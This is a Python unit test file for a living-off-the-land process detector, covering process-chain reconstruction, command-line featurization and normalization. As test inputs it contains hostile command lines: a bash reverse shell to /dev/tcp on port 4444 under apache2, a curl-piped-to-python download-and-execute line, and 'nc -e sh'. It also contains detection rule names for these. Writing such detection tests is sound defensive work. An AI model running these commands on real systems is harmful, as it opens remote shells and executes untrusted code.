"""cd ai && uv run python -m unittest tests/test_lotl.py"""

import json
import tempfile
import unittest
from pathlib import Path

from lotl.chains import read_trace
from lotl.features import featurize, log_complexity
from lotl.train import normalize


def ev(pid, **kind):
    return json.dumps({"timestamp": {"secs_since_epoch": 0, "nanos_since_epoch": 0}, "pid": pid, "kind": kind})


class ChainTest(unittest.TestCase):
    def test_fork_exec_exit_and_pid_reuse(self):
        lines = [
            ev(1, type="ProcessStart", name="systemd", exe="/usr/lib/systemd/systemd", start_ticks=1, ppid=0, cmdline="/sbin/init"),
            ev(10, type="ProcessStart", name="nginx", exe="/usr/sbin/nginx", start_ticks=2, ppid=1, cmdline="nginx"),
            # fork of nginx before exec: same program, no record
            ev(20, type="ProcessStart", name="nginx", exe="/usr/sbin/nginx", start_ticks=3, ppid=10, cmdline="nginx"),
            ev(20, type="ProcessExec", name="sh", exe="/usr/bin/sh", cmdline="sh -c id"),
            ev(20, type="ProcessExit"),
            # pid 20 reused under an unknown parent: falls back to parent_exe
            ev(20, type="ProcessStart", name="Foo.EXE", exe=None, start_ticks=9, ppid=99, parent_exe="C:\\Windows\\cmd.exe", cmdline="foo"),
        ]
        with tempfile.NamedTemporaryFile("w", suffix=".jsonl", delete=False) as f:
            f.write("\n".join(lines))
        try:
            got = read_trace(Path(f.name))
        finally:
            Path(f.name).unlink()
        self.assertEqual([r["chain"] for r in got],
                         [["systemd"], ["systemd", "nginx"], ["systemd", "nginx", "sh"], ["cmd", "foo"]])


class FeatureTest(unittest.TestCase):
    def test_reverse_shell_under_web_server(self):
        f = featurize({"chain": ["systemd", "apache2", "sh"], "cmdline": "sh -c bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"})
        for t in ("PAIR_CLASS_SERVER>INTERP", "ANCESTOR_SERVER", "PATH_DEV_TCP", "IP_PUBLIC",
                  "RULE_reverse_shell", "RULE_interactive_shell", "PAT_dup_fd", "CMD_bash", "PARAM_-i"):
            self.assertIn(t, f)
        self.assertEqual(f["num_depth"], 2)

    def test_pipe_to_interpreter_is_word_bounded(self):
        hit = featurize({"chain": ["bash", "sh"], "cmdline": "curl -s http://x.io/a | sudo python3"})
        miss = featurize({"chain": ["bash", "sh"], "cmdline": "cat a | sha256sum"})
        self.assertIn("RULE_pipe_to_interpreter", hit)
        self.assertNotIn("RULE_pipe_to_interpreter", miss)

    def test_complexity_stays_finite_on_long_payloads(self):
        self.assertEqual(log_complexity("aaaa"), 0.0)
        self.assertLess(log_complexity("aB1+" * 2000), 1e4)

    def test_normalize_merges_volatile_values(self):
        self.assertEqual(normalize("nc 10.0.0.5 4444"), normalize("nc 192.168.1.9 9001"))
        self.assertNotEqual(normalize("nc -e sh 10.0.0.5 1"), normalize("nc -z 10.0.0.5 1"))


if __name__ == "__main__":
    unittest.main()
